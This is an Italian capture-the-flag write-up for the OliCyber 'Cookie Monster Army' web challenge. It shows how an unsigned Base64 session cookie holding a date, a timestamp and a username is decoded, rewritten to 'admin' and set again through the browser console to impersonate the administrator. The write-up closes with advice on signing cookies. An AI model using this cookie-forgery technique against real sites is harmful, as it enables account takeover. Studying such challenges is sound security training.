# Cookie Monster Army

**Competizione:** OliCyber<br>
**Categoria:** Web / Session Hijacking<br>
**URL:** http://cma.challs.olicyber.it

---

## Descrizione

> *Il Cookie Monster è stanco di questo mondo così amaro, ma per conquistarlo avrà bisogno di tutto l'aiuto possibile. Arruolati anche tu per questa impresa!*

---

## Soluzione

### Step 1 — Ricognizione Iniziale

Visitando il sito, si accede a una pagina di registrazione e login. Dopo aver creato un account e autenticato, si viene reindirizzati a:

```
http://cma.challs.olicyber.it/home.php
```

---

### Step 2 — Analisi del Cookie di Sessione

Ispezionando i cookie tramite gli strumenti di sviluppo del browser (F12 → Application/Storage → Cookies) o un proxy come Burp Suite, si nota un cookie di sessione dal valore sospetto:

```
MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWhhY2tlcmZyZWdz
```

Il formato suggerisce una codifica **Base64**. Decodificando dal terminale:

```bash
echo "MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWhhY2tlcmZyZWdz" | base64 -d
```

**Output:**
```
2026/03/11-1773246748-<your_username>
```

---

### Step 3 — Struttura del Cookie

La struttura del cookie decodificato è:

| Campo | Valore |
|---|---|
| Data | `2026/03/11` |
| Timestamp | `1773246748` |
| Username | `<your_username>` |

---

### Step 4 — Vulnerabilità Identificata

**Il cookie di sessione è costruito semplicemente concatenando data, timestamp e nome utente, senza alcuna firma crittografica** (es. HMAC o signature). Questo significa che è possibile **forgiare un cookie arbitrario** modificando il campo username.

Il server si fida ciecamente del contenuto del cookie, senza verificarne l'integrità mediante alcuna verifica crittografica.

**Questa è una vulnerabilità critica di Broken Authentication.**

---

### Step 5 — Exploit

L'obiettivo è impersonare l'utente `admin`. È sufficiente:

1. Costruire il payload modificato, mantenendo la stessa data e timestamp ma cambiando lo username:
```
2026/03/11-1773246748-admin
```

2. Codificarlo in Base64:
```bash
echo -n "2026/03/11-1773246748-admin" | base64
```

**Output:**
```
MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWFkbWlu
```

3. Sostituire il valore del cookie nel browser:
   - Aprire DevTools (`F12` → Application → Cookies)
   - Trovare il cookie di sessione
   - Modificare il valore con il nuovo payload codificato
   - Oppure, usare la console del browser:
   ```javascript
   document.cookie = "session=MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWFkbWlu; path=/";
   ```

4. Ricaricare la pagina. Si viene ora autenticati come `admin` e si ottiene la flag.

---

### Step 6 — Risultato

Accedendo come `admin`, si ottiene la flag della challenge.

---

## Conclusioni

Non bisogna mai fidarsi dei dati lato client senza una verifica di integrità. I cookie di sessione devono essere:

- **Firmati** crittograficamente (es. con HMAC-SHA256)
- **Opachi** per il client (es. token random mappato server-side)
- **Non predicibili** nella loro struttura
- **Non contenere informazioni sensibili in chiaro** (nemmeno codificate con Base64)

Un cookie che espone direttamente il nome utente, anche se codificato in Base64, è una vulnerabilità critica.